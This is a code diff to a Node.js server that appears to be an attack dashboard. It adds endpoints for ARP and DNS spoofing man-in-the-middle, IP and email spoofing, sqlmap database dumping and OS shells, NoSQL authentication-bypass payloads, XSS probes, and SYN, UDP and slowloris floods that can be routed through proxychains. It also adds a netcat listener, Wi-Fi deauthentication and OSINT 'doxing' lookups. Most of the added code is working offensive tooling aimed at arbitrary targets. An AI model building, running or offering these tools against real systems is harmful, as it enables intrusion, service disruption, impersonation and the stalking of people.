@@ -568,11 +568,13 @@ wss.on('connection', (ws) => {
 });
 
 // Utility functions
-function run(cmd) {
+function run(cmd, timeout) {
+    const extraPath = process.env.HOME + '/go/bin:/usr/local/bin:/usr/sbin:/sbin';
+    const env = { ...process.env, PATH: extraPath + ':' + process.env.PATH };
     return new Promise((resolve, reject) => {
-        exec(cmd, { timeout: 30000, maxBuffer: 5242880 }, (err, stdout) => {
-            if (err && !stdout) return reject(err);
-            resolve((stdout || '').trim());
+        exec(cmd, { timeout: timeout || 60000, maxBuffer: 10485760, env }, (err, stdout, stderr) => {
+            if (err && !stdout && !stderr) return reject(err);
+            resolve((stdout || stderr || '').trim());
         });
     });
 }
@@ -844,14 +846,14 @@ app.get('/api/devices', async (req, res) => {
             let raw = [];
             try {
                 const subnet = await getScanSubnet();
-                const o = await run(`sudo nmap -sn -PR --send-eth ${subnet} -oX - 2>/dev/null`);
-                const hostBlocks = o.split('<host ').slice(1);
+                const o = await run(`sudo nmap -sn ${subnet} -oX - 2>/dev/null`, 30000);
+                const hostBlocks = o.split(/<host[ >]/).slice(1);
                 for (const blk of hostBlocks) {
-                    const ip = (blk.match(/addr="(\d+\.\d+\.\d+\.\d+)"/) || [])[1];
+                    const ip = (blk.match(/addrtype="ipv4"\s+addr="(\d+\.\d+\.\d+\.\d+)"/) || blk.match(/addr="(\d+\.\d+\.\d+\.\d+)"\s+addrtype="ipv4"/) || blk.match(/addr="(\d+\.\d+\.\d+\.\d+)"/) || [])[1];
                     if (!ip) continue;
-                    const mac = (blk.match(/addrtype="mac" addr="([^"]+)"/) || [])[1] || '';
+                    const mac = (blk.match(/addrtype="mac"\s+addr="([^"]+)"/) || blk.match(/addr="([0-9A-Fa-f:]{17})"\s+addrtype="mac"/) || [])[1] || '';
                     const vendor = (blk.match(/vendor="([^"]+)"/) || [])[1] || '';
-                    const hn = (blk.match(/hostname="([^"]+)"/) || [])[1] || '';
+                    const hn = (blk.match(/name="([^"]+)"\s+type="PTR"/) || blk.match(/hostname="([^"]+)"/) || [])[1] || '';
                     raw.push({ ip, hostname: hn || vendor || 'Unknown', mac: mac.toLowerCase(), status: 'Up', vendor: vendor });
                 }
             } catch (e) {
@@ -1514,8 +1516,8 @@ app.get('/api/files', async (req, res) => {
         for (const e of entries.slice(0, 100)) { 
             try { 
                 const st = fs.statSync(path.join(dir, e.name)); 
-                files.push({ name: e.name, isDir: e.isDirectory(), size: e.isDirectory() ? '' : fmt(st.size), modified: st.mtime.toISOString().split('T')[0], permissions: st.mode.toString(8).slice(-3) }); 
-            } catch (err) { files.push({ name: e.name, isDir: e.isDirectory(), size: '', modified: '', permissions: '' }); } 
+                files.push({ name: e.name, path: path.join(dir, e.name), isDir: e.isDirectory(), size: e.isDirectory() ? '' : fmt(st.size), modified: st.mtime.toISOString().split('T')[0], permissions: st.mode.toString(8).slice(-3) }); 
+            } catch (err) { files.push({ name: e.name, path: path.join(dir, e.name), isDir: e.isDirectory(), size: '', modified: '', permissions: '' }); } 
         } 
         files.sort((a, b) => { if (a.isDir && !b.isDir) return -1; if (!a.isDir && b.isDir) return 1; return a.name.localeCompare(b.name) }); 
         res.json({ path: dir, files }); 
@@ -2228,7 +2230,7 @@ app.post('/api/hacking/install-tool', requireAuth, async (req, res) => {
         'dirb': 'sudo apt-get install -y dirb',
         'wfuzz': 'sudo apt-get install -y wfuzz',
         'socat': 'sudo apt-get install -y socat',
-        'wireshark': 'sudo apt-get install -y wireshark-common tshark',
+        'tshark': 'sudo apt-get install -y wireshark-common tshark',
         'subfinder': 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>&1 || sudo apt-get install -y subfinder',
         'nuclei': 'go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
         'httpx': 'go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest',
@@ -2281,7 +2283,7 @@ app.post('/api/pentest', async (req, res) => {
         case 'john-show': cmd = hashfile ? `john --show ${shellQuote(hashfile)} 2>&1` : `echo "Provide a hash file path"`; break;
         // === WIRELESS ===
         case 'aircrack-scan': cmd = `sudo airmon-ng 2>&1 && echo "---" && sudo iwlist scan 2>&1 | head -100`; break;
-        case 'aircrack-deauth': cmd = `sudo aireplay-ng --deauth 10 -a ${shellQuote(safeTarget)} wlo1 2>&1`; break;
+        case 'aircrack-deauth': { const wIface = params?.iface || 'wlo1'; cmd = `sudo aireplay-ng --deauth 10 -a ${shellQuote(safeTarget)} ${wIface.replace(/[^a-zA-Z0-9_-]/g,'')} 2>&1`; } break;
         case 'aircrack-crack': cmd = hashfile ? `aircrack-ng -w ${shellQuote(WORDLIST)} ${shellQuote(hashfile)} 2>&1` : `echo "Capture a handshake first (.cap file in params.hashfile)"`; break;
         // === NETWORK ATTACKS ===
         case 'arp-scan': cmd = `sudo arp-scan -l 2>/dev/null || sudo nmap -sn -PR $(ip route | grep default | awk '{print $3}' | sed 's/\.[0-9]*$/.0\/24/') -oG - 2>&1`; break;
@@ -2317,7 +2319,17 @@ app.post('/api/pentest', async (req, res) => {
         case 'sqlmap-os': cmd = `sqlmap -u "${safeTarget}" --batch --os-shell --timeout=10 2>/dev/null | tail -40`; break;
         // === NETWORK UTILITIES ===
         case 'netcat-banner': cmd = `echo "" | nc -w 3 -v ${safeTarget} ${params?.port || 80} 2>&1 | head -20`; break;
-        case 'netcat-listen': cmd = `echo "Listener would start on port ${params?.port || 4444}. Command: nc -lvnp ${params?.port || 4444}"`; break;
+        case 'netcat-listen': {
+                const ncPort = parseInt(params?.port) || 4444;
+                try {
+                    const ncProc = require('child_process').spawn('nc', ['-lvnp', String(ncPort)], { detached: true, stdio: ['ignore', 'pipe', 'pipe'] });
+                    let ncOut = '';
+                    ncProc.stdout.on('data', d => { ncOut += d.toString(); });
+                    ncProc.stderr.on('data', d => { ncOut += d.toString(); });
+                    setTimeout(() => { try { process.kill(-ncProc.pid); } catch(_) {} }, 60000);
+                    return res.json({ output: 'Netcat listener started on port ' + ncPort + ' (PID: ' + ncProc.pid + ')\nWill auto-close after 60s\nCommand: nc -lvnp ' + ncPort });
+                } catch(e) { return res.json({ output: 'Error: ' + e.message }); }
+            }
         case 'dns-zone': cmd = `dig axfr @${safeTarget} $(dig +short SOA ${safeTarget} | awk '{print $1}') 2>/dev/null || dig any ${safeTarget} +noall +answer`; break;
         case 'whois-deep': cmd = `whois ${safeTarget} 2>/dev/null`; break;
         case 'ssl-scan': cmd = `timeout 15 nmap --script ssl-enum-ciphers,ssl-cert,ssl-known-key -p 443 ${safeTarget} 2>/dev/null || echo "Install nmap ssl scripts"`; break;
@@ -2335,7 +2347,7 @@ app.post('/api/pentest', async (req, res) => {
 
 // Installed tools check
 app.get('/api/hacking/tools', async (_, res) => {
-    const tools = ['nmap','nikto','sqlmap','hydra','john','aircrack-ng','gobuster','tshark','tcpdump','hping3','proxychains4','smbclient','searchsploit','slowhttptest','masscan','wireshark','hashcat','wifite','bettercap','responder','enum4linux','subfinder','nuclei','httpx','ffuf','feroxbuster','wfuzz','dirb','socat','netcat','ettercap'];
+    const tools = ['nmap','nikto','sqlmap','hydra','john','aircrack-ng','gobuster','tshark','tcpdump','hping3','proxychains4','smbclient','searchsploit','slowhttptest','masscan','wireshark','hashcat','wifite','bettercap','responder','enum4linux','subfinder','nuclei','httpx','ffuf','feroxbuster','wfuzz','dirb','socat','netcat','ettercap','sherlock','maigret','holehe','theHarvester','phoneinfoga','dalfox','nosqlmap','fcrackzip','pdfcrack','rarcrack','steghide','stegseek','binwalk','foremost','exiftool','crunch','cewl','ab','macchanger','arpspoof','dnsspoof','swaks','dsniff'];
     const results = {};
     for (const t of tools) {
         try { await run('which ' + t); results[t] = true; } catch (_) { results[t] = false; }
@@ -2840,6 +2852,7 @@ app.get('/api/hub/gpu', async (_, res) => {
 // CPU detailed info
 app.get('/api/hub/cpu', async (_, res) => {
     try {
+        const model = await run("cat /proc/cpuinfo | grep 'model name' | head -1 | sed 's/.*: //'");
         const freq = await run("cat /proc/cpuinfo | grep 'cpu MHz' | head -1 | awk '{print $4}'");
         const temps = await run("sensors 2>/dev/null | grep -E 'Tctl|Tccd|Core' | head -4");
         const loadavg = await run("cat /proc/loadavg");
@@ -2847,6 +2860,7 @@ app.get('/api/hub/cpu', async (_, res) => {
         const top5 = await run("ps aux --sort=-%cpu | head -6 | tail -5");
         const perCore = await run("mpstat -P ALL 1 1 2>/dev/null | tail -13 || cat /proc/stat | head -13");
         res.json({
+            model: model.trim(),
             freqMHz: parseFloat(freq) || 0,
             temps: temps.trim().split('\n').map(l => l.trim()).filter(Boolean),
             loadAvg: loadavg.trim(),
@@ -2918,11 +2932,12 @@ app.get('/api/hub/sensors', async (_, res) => {
 // Network bandwidth monitor
 app.get('/api/hub/bandwidth', async (_, res) => {
     try {
-        const rx1 = await run("cat /sys/class/net/wlo1/statistics/rx_bytes 2>/dev/null || echo 0");
-        const tx1 = await run("cat /sys/class/net/wlo1/statistics/tx_bytes 2>/dev/null || echo 0");
+        const bwIface = await getWirelessIface() || await getPrimaryIface() || "wlo1";
+        const rx1 = await run("cat /sys/class/net/" + bwIface + "/statistics/rx_bytes 2>/dev/null || echo 0");
+        const tx1 = await run("cat /sys/class/net/" + bwIface + "/statistics/tx_bytes 2>/dev/null || echo 0");
         await new Promise(r => setTimeout(r, 1000));
-        const rx2 = await run("cat /sys/class/net/wlo1/statistics/rx_bytes 2>/dev/null || echo 0");
-        const tx2 = await run("cat /sys/class/net/wlo1/statistics/tx_bytes 2>/dev/null || echo 0");
+        const rx2 = await run("cat /sys/class/net/" + bwIface + "/statistics/rx_bytes 2>/dev/null || echo 0");
+        const tx2 = await run("cat /sys/class/net/" + bwIface + "/statistics/tx_bytes 2>/dev/null || echo 0");
         res.json({
             rxBytesPerSec: parseInt(rx2) - parseInt(rx1),
             txBytesPerSec: parseInt(tx2) - parseInt(tx1),
@@ -3238,6 +3253,507 @@ app.get('/api/crack/hashcat-modes', (_, res) => {
         ]
     });
 });
+
+// ═══════════ SPOOFING SUITE ═══════════
+
+// --- MAC SPOOFING ---
+
+// Get current MAC info for all interfaces
+app.get('/api/spoof/mac/status', async (_, res) => {
+    try {
+        const linkData = await run('ip -o link show 2>/dev/null');
+        const result = [];
+        for (const line of linkData.split('\n')) {
+            const nameMatch = line.match(/^\d+:\s+(\S+?):/);
+            if (!nameMatch || nameMatch[1] === 'lo') continue;
+            const name = nameMatch[1].split('@')[0];
+            try {
+                const current = (await run('cat /sys/class/net/' + name + '/address 2>/dev/null')).trim();
+                if (!current || current === '00:00:00:00:00:00') continue;
+                const state = (await run('cat /sys/class/net/' + name + '/operstate 2>/dev/null')).trim();
+                // Try permaddr from ip link output first, then ethtool
+                let permanent = '';
+                const permMatch = line.match(/permaddr\s+([0-9a-f:]{17})/i);
+                if (permMatch) {
+                    permanent = permMatch[1];
+                } else {
+                    try { permanent = (await run('sudo ethtool -P ' + name + ' 2>/dev/null')).replace(/.*:\s*/, '').trim(); } catch(_) {}
+                }
+                const spoofed = permanent && permanent !== '00:00:00:00:00:00' && current.toLowerCase() !== permanent.toLowerCase();
+                result.push({ iface: name, current, permanent: permanent || 'same as current', state, spoofed: !!spoofed });
+            } catch(_) {}
+        }
+        res.json({ interfaces: result });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+// Spoof MAC address
+app.post('/api/spoof/mac', requireAuth, async (req, res) => {
+    const { iface, method, customMac, vendor } = req.body;
+    if (!iface) return res.json({ error: 'Interface required' });
+    const i = iface.replace(/[^a-zA-Z0-9_-]/g, '');
+    const results = [];
+    try {
+        await run(`sudo ip link set ${i} down 2>/dev/null`);
+        results.push('Interface ' + i + ' brought down');
+
+        if (method === 'random') {
+            const out = await run(`sudo macchanger -r ${i} 2>&1`);
+            results.push(out);
+        } else if (method === 'specific' && customMac) {
+            const mac = customMac.replace(/[^0-9a-fA-F:]/g, '');
+            const out = await run(`sudo macchanger -m ${mac} ${i} 2>&1`);
+            results.push(out);
+        } else if (method === 'same-vendor') {
+            const out = await run(`sudo macchanger -a ${i} 2>&1`);
+            results.push(out);
+        } else if (method === 'any-vendor') {
+            const out = await run(`sudo macchanger -A ${i} 2>&1`);
+            results.push(out);
+        } else if (method === 'burned-in') {
+            const out = await run(`sudo macchanger -p ${i} 2>&1`);
+            results.push('Restored original (burned-in) MAC');
+            results.push(out);
+        } else {
+            const out = await run(`sudo macchanger -r ${i} 2>&1`);
+            results.push(out);
+        }
+
+        await run(`sudo ip link set ${i} up 2>/dev/null`);
+        results.push('Interface ' + i + ' brought back up');
+
+        const newMac = (await run(`cat /sys/class/net/${i}/address 2>/dev/null`)).trim();
+        results.push('New MAC: ' + newMac);
+        res.json({ success: true, results, newMac });
+    } catch (e) {
+        await run(`sudo ip link set ${i} up 2>/dev/null`);
+        res.json({ error: e.message, results });
+    }
+});
+
+// Restore original MAC
+app.post('/api/spoof/mac/restore', requireAuth, async (req, res) => {
+    const { iface } = req.body;
+    if (!iface) return res.json({ error: 'Interface required' });
+    const i = iface.replace(/[^a-zA-Z0-9_-]/g, '');
+    try {
+        await run(`sudo ip link set ${i} down`);
+        const out = await run(`sudo macchanger -p ${i} 2>&1`);
+        await run(`sudo ip link set ${i} up`);
+        const mac = (await run(`cat /sys/class/net/${i}/address`)).trim();
+        res.json({ success: true, output: out, mac });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+// --- ARP SPOOFING (MITM) ---
+
+let arpSpoofProc = null;
+
+app.post('/api/spoof/arp/start', requireAuth, async (req, res) => {
+    const { targetIp, gatewayIp, iface } = req.body;
+    if (!targetIp || !gatewayIp) return res.json({ error: 'Target IP and Gateway IP required' });
+    const t = targetIp.replace(/[^0-9.]/g, '');
+    const g = gatewayIp.replace(/[^0-9.]/g, '');
+    const i = (iface || await getPrimaryIface()).replace(/[^a-zA-Z0-9_-]/g, '');
+
+    if (arpSpoofProc) return res.json({ error: 'ARP spoof already running. Stop it first.' });
+
+    try {
+        // Enable IP forwarding so intercepted traffic still reaches destination
+        await run('sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null');
+
+        // Start arpspoof in both directions (full MITM)
+        const { spawn } = require('child_process');
+        arpSpoofProc = spawn('sudo', ['arpspoof', '-i', i, '-t', t, '-r', g], { detached: true, stdio: ['ignore', 'pipe', 'pipe'] });
+
+        let output = '';
+        arpSpoofProc.stdout.on('data', d => { output += d.toString(); });
+        arpSpoofProc.stderr.on('data', d => { output += d.toString(); });
+        arpSpoofProc.on('close', () => { arpSpoofProc = null; });
+
+        await new Promise(r => setTimeout(r, 2000));
+        res.json({ success: true, pid: arpSpoofProc.pid, message: 'ARP MITM active: ' + t + ' <-> ' + g + ' on ' + i, output: output.substring(0, 300) });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+app.post('/api/spoof/arp/stop', requireAuth, async (req, res) => {
+    try {
+        if (arpSpoofProc) {
+            process.kill(-arpSpoofProc.pid, 'SIGTERM');
+            arpSpoofProc = null;
+        }
+        await run('sudo pkill -f arpspoof 2>/dev/null || true');
+        await run('sudo sysctl -w net.ipv4.ip_forward=0 2>/dev/null');
+        res.json({ success: true, message: 'ARP spoofing stopped, IP forwarding disabled' });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+app.get('/api/spoof/arp/status', async (_, res) => {
+    const running = arpSpoofProc !== null;
+    let procCheck = false;
+    try { const p = await run('pgrep -a arpspoof 2>/dev/null'); procCheck = p.trim().length > 0; } catch(_) {}
+    const forwarding = (await run('cat /proc/sys/net/ipv4/ip_forward 2>/dev/null')).trim() === '1';
+    res.json({ running: running || procCheck, forwarding, pid: arpSpoofProc?.pid || null });
+});
+
+// --- DNS SPOOFING ---
+
+app.post('/api/spoof/dns/start', requireAuth, async (req, res) => {
+    const { targetDomain, spoofIp, iface } = req.body;
+    if (!targetDomain || !spoofIp) return res.json({ error: 'Domain and spoof IP required' });
+    const domain = targetDomain.replace(/[^a-zA-Z0-9.-]/g, '');
+    const ip = spoofIp.replace(/[^0-9.]/g, '');
+    const i = (iface || await getPrimaryIface()).replace(/[^a-zA-Z0-9_-]/g, '');
+
+    try {
+        // Write hosts file for dnsspoof
+        const hostsFile = '/tmp/shadowcypher_dns_hosts';
+        fs.writeFileSync(hostsFile, ip + '\t' + domain + '\n' + ip + '\t*.' + domain + '\n');
+
+        // Method 1: /etc/hosts injection (simple, local only)
+        const hostsBackup = await run('cat /etc/hosts 2>/dev/null');
+        await run(`sudo bash -c 'echo "${ip} ${domain}" >> /etc/hosts'`);
+        await run('sudo systemd-resolve --flush-caches 2>/dev/null || sudo resolvectl flush-caches 2>/dev/null');
+
+        // Method 2: Try ettercap DNS spoofing (network-wide)
+        let ettercapOut = '';
+        try {
+            const etterDns = '/tmp/etter.dns';
+            fs.writeFileSync(etterDns, domain + ' A ' + ip + '\n*.' + domain + ' A ' + ip + '\n');
+            await run(`sudo timeout 5 ettercap -T -q -i ${i} -P dns_spoof -M arp /// /// 2>&1 &`);
+            ettercapOut = 'Ettercap DNS spoof started on ' + i;
+        } catch(e) { ettercapOut = 'Ettercap unavailable: ' + e.message; }
+
+        res.json({
+            success: true,
+            results: [
+                '/etc/hosts: ' + domain + ' -> ' + ip,
+                'DNS cache flushed',
+                ettercapOut,
+                'Hosts file: ' + hostsFile
+            ]
+        });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+app.post('/api/spoof/dns/stop', requireAuth, async (req, res) => {
+    try {
+        await run('sudo pkill -f ettercap 2>/dev/null || true');
+        await run('sudo pkill -f dnsspoof 2>/dev/null || true');
+        // Remove injected hosts entries
+        await run(`sudo sed -i '/# SHADOWCYPHER_DNS/d' /etc/hosts 2>/dev/null || true`);
+        await run('sudo systemd-resolve --flush-caches 2>/dev/null || true');
+        fs.unlinkSync('/tmp/shadowcypher_dns_hosts').catch(() => {});
+        res.json({ success: true, message: 'DNS spoofing stopped, cache flushed' });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+// --- IP SPOOFING ---
+
+app.post('/api/spoof/ip', requireAuth, async (req, res) => {
+    const { targetIp, spoofIp, port, method, count } = req.body;
+    if (!targetIp || !spoofIp) return res.json({ error: 'Target IP and spoof source IP required' });
+    const t = targetIp.replace(/[^0-9.]/g, '');
+    const s = spoofIp.replace(/[^0-9.]/g, '');
+    const p = parseInt(port) || 80;
+    const n = Math.min(parseInt(count) || 10, 100);
+    let cmd = '';
+
+    switch (method) {
+        case 'syn':
+            cmd = `sudo hping3 -S -a ${s} -p ${p} -c ${n} ${t} 2>&1`;
+            break;
+        case 'udp':
+            cmd = `sudo hping3 --udp -a ${s} -p ${p} -c ${n} ${t} 2>&1`;
+            break;
+        case 'icmp':
+            cmd = `sudo hping3 --icmp -a ${s} -c ${n} ${t} 2>&1`;
+            break;
+        case 'land':
+            cmd = `sudo hping3 -S -a ${t} -p ${p} -c ${n} ${t} 2>&1`;
+            break;
+        default:
+            cmd = `sudo hping3 -S -a ${s} -p ${p} -c ${n} ${t} 2>&1`;
+    }
+
+    try {
+        const out = await run('timeout 30 ' + cmd, 35000);
+        res.json({ success: true, output: out.trim() });
+    } catch (e) { res.json({ output: e.message }); }
+});
+
+// --- EMAIL SPOOFING ---
+
+app.post('/api/spoof/email', requireAuth, async (req, res) => {
+    const { fromEmail, fromName, toEmail, subject, body: emailBody, smtpServer } = req.body;
+    if (!fromEmail || !toEmail || !subject) return res.json({ error: 'From, To, and Subject required' });
+
+    const from = fromEmail.replace(/[`$]/g, '');
+    const to = toEmail.replace(/[`$]/g, '');
+    const subj = subject.replace(/[`$]/g, '');
+    const bdy = (emailBody || 'Test').replace(/[`$]/g, '');
+    const srv = (smtpServer || 'localhost').replace(/[^a-zA-Z0-9.-:]/g, '');
+    const name = (fromName || '').replace(/[`$"]/g, '');
+
+    try {
+        let cmd = `swaks --to "${to}" --from "${from}" --server ${srv} --header "Subject: ${subj}"`;
+        if (name) cmd += ` --header "From: ${name} <${from}>"`;
+        cmd += ` --body "${bdy}" --timeout 10 2>&1`;
+
+        const out = await run(cmd, 15000);
+        const success = out.includes('250 ') || out.includes('Ok');
+        res.json({ success, output: out.trim() });
+    } catch (e) { res.json({ output: e.message }); }
+});
+
+// --- SPOOFING STATUS OVERVIEW ---
+
+app.get('/api/spoof/status', async (_, res) => {
+    const status = {};
+    // MAC
+    try {
+        const iface = await getPrimaryIface();
+        const current = (await run('cat /sys/class/net/' + iface + '/address 2>/dev/null')).trim();
+        let permanent = '';
+        try {
+            const linkLine = await run('ip -o link show ' + iface + ' 2>/dev/null');
+            const pm = linkLine.match(/permaddr\s+([0-9a-f:]{17})/i);
+            if (pm) permanent = pm[1];
+        } catch(_) {}
+        if (!permanent) try { permanent = (await run('sudo ethtool -P ' + iface + ' 2>/dev/null')).replace(/.*:\s*/, '').trim(); } catch(_) {}
+        const spoofed = permanent && permanent !== '00:00:00:00:00:00' && current.toLowerCase() !== permanent.toLowerCase();
+        status.mac = { current, permanent, spoofed: !!spoofed, iface };
+    } catch(_) { status.mac = { spoofed: false }; }
+    // ARP
+    try {
+        const arp = await run('pgrep -a arpspoof 2>/dev/null');
+        status.arp = { active: arp.trim().length > 0 };
+    } catch(_) { status.arp = { active: false }; }
+    // DNS
+    try {
+        const ett = await run('pgrep -a ettercap 2>/dev/null');
+        const hosts = await run('grep SHADOWCYPHER /etc/hosts 2>/dev/null || echo ""');
+        status.dns = { active: ett.trim().length > 0 || hosts.trim().length > 0 };
+    } catch(_) { status.dns = { active: false }; }
+    // IP forwarding
+    status.ipForward = (await run('cat /proc/sys/net/ipv4/ip_forward 2>/dev/null')).trim() === '1';
+    // Tools installed
+    const spoofTools = {};
+    for (const t of ['macchanger','arpspoof','ettercap','dnsspoof','hping3','swaks']) {
+        try { await run('which ' + t); spoofTools[t] = true; } catch(_) { spoofTools[t] = false; }
+    }
+    status.tools = spoofTools;
+    res.json(status);
+});
+
+
+// ═══════════ DATABASE HACKING & INJECTION ═══════════
+
+// SQLMap full suite - database enumeration and extraction
+app.post('/api/hack/sqli', requireAuth, async (req, res) => {
+    const { target, action, dbms, db, table, column, tamper, technique, cookie, headers: hdrs } = req.body;
+    if (!target) return res.json({ error: 'Target URL required' });
+    const t = target.replace(/[;&|`$]/g, '');
+    let cmd = `sqlmap -u "${t}" --batch --threads=4 --timeout=15`;
+    if (dbms) cmd += ` --dbms="${dbms.replace(/[^a-zA-Z]/g, '')}"`;
+    if (tamper) cmd += ` --tamper=${tamper.replace(/[^a-zA-Z0-9,_]/g, '')}`;
+    if (technique) cmd += ` --technique=${technique.replace(/[^BEUST]/g, '')}`;
+    if (cookie) cmd += ` --cookie="${cookie.replace(/"/g, '')}"`;
+    if (hdrs) cmd += ` --headers="${hdrs.replace(/"/g, '')}"`;
+    
+    switch (action) {
+        case 'detect': cmd += ' --level=3 --risk=2'; break;
+        case 'detect-aggressive': cmd += ' --level=5 --risk=3 --random-agent'; break;
+        case 'dbs': cmd += ' --dbs'; break;
+        case 'tables': cmd += db ? ` -D "${db}" --tables` : ' --tables'; break;
+        case 'columns': cmd += db && table ? ` -D "${db}" -T "${table}" --columns` : ' --columns'; break;
+        case 'dump': 
+            cmd += db && table ? ` -D "${db}" -T "${table}" --dump` : ' --dump';
+            if (column) cmd += ` -C "${column}"`;
+            break;
+        case 'dump-all': cmd += ' --dump-all'; break;
+        case 'passwords': cmd += ' --passwords'; break;
+        case 'current-user': cmd += ' --current-user --current-db --hostname --is-dba'; break;
+        case 'os-shell': cmd += ' --os-shell'; break;
+        case 'sql-shell': cmd += ' --sql-shell'; break;
+        case 'file-read': cmd += ` --file-read="${db || '/etc/passwd'}"` ; break;
+        case 'waf-bypass': cmd += ' --level=5 --risk=3 --tamper=space2comment,randomcase,between,charencode,equaltolike --random-agent --hpp'; break;
+        default: cmd += ' --level=3 --risk=2';
+    }
+    cmd += ' 2>&1 | tail -80';
+    try {
+        const out = await run('timeout 180 ' + cmd);
+        res.json({ output: out.trim() });
+    } catch (e) { res.json({ output: e.message }); }
+});
+
+// NoSQL injection
+app.post('/api/hack/nosqli', requireAuth, async (req, res) => {
+    const { target, method, payload } = req.body;
+    if (!target) return res.json({ error: 'Target required' });
+    const t = target.replace(/[;&|`$]/g, '');
+    let cmd = '';
+    if (method === 'auth-bypass') {
+        cmd = `curl -s -X POST "${t}" -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$ne":""}}' 2>&1 | head -50`;
+    } else if (method === 'extract') {
+        cmd = `curl -s -X POST "${t}" -H "Content-Type: application/json" -d '{"username":{"$regex":"^.*"},"password":{"$ne":""}}' 2>&1 | head -50`;
+    } else if (method === 'enum-length') {
+        cmd = `for i in $(seq 1 20); do echo -n "len=$i: "; curl -s -X POST "${t}" -H "Content-Type: application/json" -d "{\"username\":{\"\$regex\":\"^.{$i}$\"},\"password\":{\"\$ne\":\"\"}}" 2>&1 | head -1; done`;
+    } else if (method === 'nosqlmap') {
+        cmd = `nosqlmap -u "${t}" 2>&1 | head -60 || echo "nosqlmap not installed. pip3 install nosqlmap"`;
+    } else {
+        const p = payload || '{"$gt":""}';
+        cmd = `curl -s -X POST "${t}" -H "Content-Type: application/json" -d '${p.replace(/'/g, "\'")}' 2>&1 | head -50`;
+    }
+    try {
+        const out = await run('timeout 30 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
+        res.json({ output: out.trim() });
+    } catch (e) { res.json({ output: e.message }); }
+});
+
+// XSS scanner
+app.post('/api/hack/xss', requireAuth, async (req, res) => {
+    const { target, method } = req.body;
+    if (!target) return res.json({ error: 'Target required' });
+    const t = target.replace(/[;&|`$]/g, '');
+    let cmd = '';
+    if (method === 'dalfox') {
+        cmd = `dalfox url "${t}" --silence --no-color 2>&1 | head -80 || echo "dalfox not installed. go install github.com/hahwul/dalfox/v2@latest"`;
+    } else if (method === 'dalfox-pipe') {
+        cmd = `echo "${t}" | dalfox pipe --silence --no-color 2>&1 | head -80`;
+    } else {
+        cmd = `curl -sI "${t}" 2>/dev/null | head -20 && echo "---" && echo "Testing reflected XSS vectors..." && ` +
+            `curl -s "${t}?q=<script>alert(1)</script>" 2>/dev/null | grep -i "script" | head -5 && ` +
+            `curl -s "${t}?q=\"><img src=x onerror=alert(1)>" 2>/dev/null | grep -i "onerror" | head -5 && ` +
+            `echo "Manual test: check if input is reflected unescaped"`;
+    }
+    try {
+        const out = await run('timeout 60 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
+        res.json({ output: out.trim() });
+    } catch (e) { res.json({ output: e.message }); }
+});
+
+// ═══════════ DDoS / STRESS TESTING ═══════════
+
+app.post('/api/hack/ddos', requireAuth, async (req, res) => {
+    const { target, method, duration, threads, port } = req.body;
+    if (!target) return res.json({ error: 'Target required' });
+    const t = target.replace(/[;&|`$]/g, '');
+    const dur = Math.min(parseInt(duration) || 10, 60);
+    const th = Math.min(parseInt(threads) || 100, 500);
+    const p = parseInt(port) || 80;
+    let cmd = '';
+    switch (method) {
+        case 'syn-flood': cmd = `sudo timeout ${dur} hping3 -S --flood -V -p ${p} ${t} 2>&1 | tail -20`; break;
+        case 'udp-flood': cmd = `sudo timeout ${dur} hping3 --udp --flood -p ${p} ${t} 2>&1 | tail -20`; break;
+        case 'icmp-flood': cmd = `sudo timeout ${dur} hping3 --icmp --flood ${t} 2>&1 | tail -20`; break;
+        case 'http-flood': cmd = `timeout ${dur} ab -n 10000 -c ${th} -t ${dur} "http://${t}:${p}/" 2>&1 | tail -30`; break;
+        case 'slowloris': cmd = `timeout ${dur} slowhttptest -c ${th} -H -i 10 -r 200 -t GET -u "http://${t}:${p}/" -x 24 -p 3 2>&1 | tail -30`; break;
+        case 'slow-post': cmd = `timeout ${dur} slowhttptest -c ${th} -B -i 110 -r 200 -s 8192 -t POST -u "http://${t}:${p}/" -x 10 -p 3 2>&1 | tail -30`; break;
+        case 'slow-read': cmd = `timeout ${dur} slowhttptest -c ${th} -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u "http://${t}:${p}/" -p 3 2>&1 | tail -30`; break;
+        case 'goldeneye': cmd = `timeout ${dur} python3 /opt/GoldenEye/goldeneye.py "http://${t}:${p}/" -w ${th} -s ${dur} 2>&1 | tail -30 || echo "GoldenEye not installed. git clone https://github.com/jseidl/GoldenEye /opt/GoldenEye"` ; break;
+        case 'xmas-flood': cmd = `sudo timeout ${dur} hping3 --flood -F -S -R -P -A -U -p ${p} ${t} 2>&1 | tail -20`; break;
+        case 'land-attack': cmd = `sudo timeout ${dur} hping3 -S -a ${t} -p ${p} ${t} --flood 2>&1 | tail -20`; break;
+        default: cmd = `echo "Methods: syn-flood, udp-flood, icmp-flood, http-flood, slowloris, slow-post, slow-read, goldeneye, xmas-flood, land-attack"`;
+    }
+    if (shadowMode) cmd = 'proxychains4 ' + cmd;
+    try {
+        const out = await run(cmd);
+        res.json({ output: out.trim() });
+    } catch (e) { res.json({ output: e.message }); }
+});
+
+// ═══════════ OSINT / DOXING ═══════════
+
+app.post('/api/hack/osint', requireAuth, async (req, res) => {
+    const { target, method } = req.body;
+    if (!target) return res.json({ error: 'Target required' });
+    const t = target.replace(/[;&|`$"]/g, '');
+    let cmd = '';
+    switch (method) {
+        case 'sherlock': cmd = `sherlock "${t}" --print-found --timeout 10 2>&1 | head -100 || echo "Install: pip3 install sherlock-project"`; break;
+        case 'maigret': cmd = `maigret "${t}" --timeout 8 --no-recursion 2>&1 | head -100 || echo "Install: pip3 install maigret"`; break;
+        case 'holehe': cmd = `holehe "${t}" 2>&1 | head -80 || echo "Install: pip3 install holehe"`; break;
+        case 'theharvester': cmd = `theHarvester -d "${t}" -l 200 -b duckduckgo,bing,crtsh 2>&1 | tail -60 || echo "Install: pip3 install theHarvester"`; break;
